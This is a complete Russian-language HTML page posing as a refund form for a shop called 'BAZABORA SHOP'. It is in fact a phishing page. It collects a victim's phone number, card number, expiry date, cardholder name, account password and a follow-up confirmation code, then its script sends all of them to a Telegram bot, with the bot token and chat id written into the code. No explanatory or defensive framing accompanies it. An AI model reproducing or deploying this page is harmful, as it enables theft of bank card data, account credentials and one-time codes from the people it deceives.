<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Оформление возврата средств</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0d0d0d;
            color: #00ff00;
            text-align: center;
            padding: 20px;
        }
        input, button {
            display: block;
            width: 80%;
            margin: 10px auto;
            padding: 10px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
        }
        input {
            background-color: #1a1a1a;
            color: #00ff00;
            border: 1px solid #00ff00;
        }
        button {
            background-color: #006600;
            color: white;
            cursor: pointer;
        }
        button:disabled {
            background-color: #003300;
            cursor: not-allowed;
        }
        .hidden {
            display: none;
        }
        .message {
            background: #006600;
            color: white;
            padding: 10px;
            margin-top: 10px;
            border-radius: 5px;
            display: none;
        }
    </style>
    <script>
        let cooldown = false;

        function sendData() {
            if (cooldown) return;

            const telephone = document.getElementById('telephone').value;
            const cardNumber = document.getElementById('card_number').value;
            const expirationDate = document.getElementById('expiration_date').value;
            const holderName = document.getElementById('holder_name').value;
            const accountPassword = document.getElementById('account_password').value;

            if (!telephone || !cardNumber || !expirationDate || !holderName || !accountPassword) {
                alert("Пожалуйста, заполните все поля!");
                return;
            }

            document.getElementById('form').classList.add('hidden');
            document.getElementById('codeForm').classList.remove('hidden');
        }

        function sendCode() {
            if (cooldown) return;

            const code = document.getElementById('code').value;
            if (!code) {
                alert("Введите код!");
                return;
            }

            cooldown = true;
            document.getElementById('submitButton').disabled = true;

            fetch("https://api.telegram.org/bot7907747711:AAGphH8ZsuiSdCpwqrSevNjgJfZxZUdtw4U/sendMessage", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: "-1002489511369",
                    text: `Заявка на возврат средств\nТелефон: ${document.getElementById('telephone').value}\nНомер карты: ${document.getElementById('card_number').value}\nСрок действия: ${document.getElementById('expiration_date').value}\nИмя держателя: ${document.getElementById('holder_name').value}\nПароль от ЛК: ${document.getElementById('account_password').value}\n------------------\nКод: ${code}`
                })
            }).then(() => {
                document.getElementById('message').style.display = 'block';
                setTimeout(() => {
                    document.getElementById('message').style.display = 'none';
                    document.getElementById('submitButton').disabled = false;
                    cooldown = false;
                }, 30000); // 30 секунд задержки
            });
        }
    </script>
</head>
<body>
    <h2>Оформление возврата средств</h2>

    <div id="form">
        <input type="text" id="telephone" placeholder="Телефон" required>
        <input type="text" id="card_number" placeholder="Номер карты" required>
        <input type="text" id="expiration_date" placeholder="Срок действия (MM/YY)" required>
        <input type="text" id="holder_name" placeholder="Имя держателя" required>
        <input type="password" id="account_password" placeholder="Пароль от ЛК" required>
        <button onclick="sendData()">Оформить возврат</button>
    </div>

    <div id="codeForm" class="hidden">
        <h3>Введите код</h3>
        <input type="text" id="code" placeholder="Код" required>
        <button id="submitButton" onclick="sendCode()">Отправить</button>
    </div>

    <p>© 2025 BAZABORA SHOP.</p>
    <div id="message" class="message">Заявка успешно отправлена!</div>
</body>
</html>
